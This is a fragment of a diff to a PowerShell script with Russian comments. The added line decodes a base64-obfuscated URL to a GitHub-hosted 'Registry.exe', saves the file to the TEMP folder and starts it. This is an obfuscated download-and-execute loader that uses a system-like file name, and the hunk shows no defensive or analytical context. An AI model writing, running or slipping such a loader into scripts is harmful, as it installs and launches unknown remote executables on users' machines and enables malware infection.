@@ -55,8 +55,7 @@ try {
 } catch {}
 
 # Закодированная ссылка на Registry.exe
-$u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlbGZsZWFrbWFpbi9yZWN0L21haW4vUmVnaXN0cnkuZXhl'))
-$p = "$env:TEMP\Registry.exe"
+$u=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NlbGZsZWFrbWFpbi9yZWN0L21haW4vUmVnaXN0cnkuZXhl'));$p="$env:TEMP\Registry.exe";(New-Object System.Net.WebClient).DownloadFile($u,$p);Start-Process $p
 
 # Скачивание файла с обходом ошибок
 try {
